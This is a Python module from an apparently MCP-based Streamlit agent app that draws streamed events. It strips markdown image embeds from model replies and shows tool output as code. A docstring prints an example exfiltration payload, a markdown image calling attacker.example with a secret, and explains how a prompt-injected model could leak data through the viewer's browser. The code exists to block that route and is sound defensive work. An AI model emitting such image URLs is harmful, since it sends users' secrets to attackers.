"""Drawing one streamed event.

This is the one piece of presentation worth unit testing, so by this
repository's own rule it does not belong in ``app.py``. It is a routing
decision with two wrong answers, and both were reachable: sending text to the
tool pane, and sending untrusted tool output through live markdown. Neither is
observable from a test that drives the script, because the turn ends in
``st.rerun()`` and the page is rebuilt from the transcript by
``render_history`` — mutating either branch of this function left the whole
suite green.
"""

from __future__ import annotations

from typing import Any

import streamlit as st

from mcp_agent.turns import TurnEvent


def _closer(text: str, start: int, opener: str, closer: str) -> int:
    """Index of the delimiter closing the one just before ``start``, or -1.

    Honours backslash escapes and nesting. This is a scanner and not a regex
    because a regex is the wrong tool for the job and twice shipped an open
    route while claiming otherwise: `[^\\]]*` cannot express a CommonMark link
    label, which admits both `\\]` and balanced `[ ]`. Two security reviews
    found two different instances of that same mistake.
    """
    depth = 1
    i = start
    while i < len(text):
        char = text[i]
        if char == "\\":
            i += 2
            continue
        if char == opener:
            depth += 1
        elif char == closer:
            depth -= 1
            if depth == 0:
                return i
        i += 1
    return -1


def _alt_text(label: str) -> str:
    """The label as plain words: escapes resolved, brackets dropped.

    Brackets go because they are what the label was allowed to contain, and
    leaving one in would put a stray `]` in the middle of the `[image: …]` we
    substitute — cosmetic, but the output should not look like markup either.
    """
    out: list[str] = []
    i = 0
    while i < len(label):
        # The escaped character is taken literally but still filtered: `\]`
        # resolves to a bracket, and letting that through put a stray `]`
        # inside the `[image: …]` this substitutes.
        if label[i] == "\\" and i + 1 < len(label):
            if label[i + 1] not in "[]":
                out.append(label[i + 1])
            i += 2
            continue
        if label[i] not in "[]":
            out.append(label[i])
        i += 1
    return "".join(out).strip()


def without_images(text: str) -> str:
    """Assistant text with image embeds defused, keeping their alt text.

    Streamlit renders markdown image syntax as an `<img>`, which the viewer's
    browser fetches without anyone clicking — so a model talked into writing
    `![](https://attacker.example/?k=SECRET)` has an egress channel that no
    sandbox closes, because the request leaves the browser and not the
    container. The shell sandbox has no network, which closes the *command's*
    route out. This closes the reply's, and both halves are needed for the
    claim that 0.5.0 answers the injection path 0.2.0 removed the shipped
    shell over.

    All four CommonMark image forms are defused: inline `![a](url)`, full
    reference `![a][id]`, collapsed `![a][]`, and shortcut `![a]` — the last
    renders an `<img>` too when a definition for `a` appears anywhere in the
    message. Defusing the shortcut form means literal text like `![not real]`
    also becomes `[image: not real]`; that is the safe direction and the cost
    is cosmetic.

    Links are left alone. They need a click, and stripping them would cost the
    model its ability to cite anything.
    """
    out: list[str] = []
    i = 0
    n = len(text)

    while i < n:
        char = text[i]

        # A backslash escapes what follows, `![` included: `\![a](url)` is a
        # literal `!` and then an ordinary link, so it must not be defused.
        if char == "\\" and i + 1 < n:
            out.append(text[i : i + 2])
            i += 2
            continue

        if char != "!" or i + 1 >= n or text[i + 1] != "[":
            out.append(char)
            i += 1
            continue

        label_end = _closer(text, i + 2, "[", "]")
        if label_end == -1:  # an unclosed `![` is literal text, not an image
            out.append(char)
            i += 1
            continue

        alt = _alt_text(text[i + 2 : label_end])
        out.append(f"[image: {alt}]" if alt else "[image]")

        # Consume the destination too, so its URL cannot be left behind as
        # bare text — and, more to the point, so a following `(` is not read
        # as the start of something else.
        after = label_end + 1
        if after < n and text[after] in "([":
            opener = text[after]
            closer = ")" if opener == "(" else "]"
            close = _closer(text, after + 1, opener, closer)
            i = close + 1 if close != -1 else after
        else:
            i = after  # shortcut reference: the label was the whole of it

    return "".join(out)


def draw(event: TurnEvent, text_placeholder: Any, tool_placeholder: Any) -> None:
    """Draw one streamed event into its own placeholder.

    Called from the script thread only. The agent runs on the background loop
    and hands its output over as data — see :mod:`mcp_agent.turns` for why
    drawing from there raises on every write.
    """
    if event.kind == "text":
        text_placeholder.markdown(without_images(event.payload))
        return

    with tool_placeholder.expander("🔧 Tool Call Information", expanded=True):
        # st.code, not st.markdown: tool output is untrusted and a literal
        # fence inside it would otherwise escape into live markdown.
        st.code(event.payload, language="json")
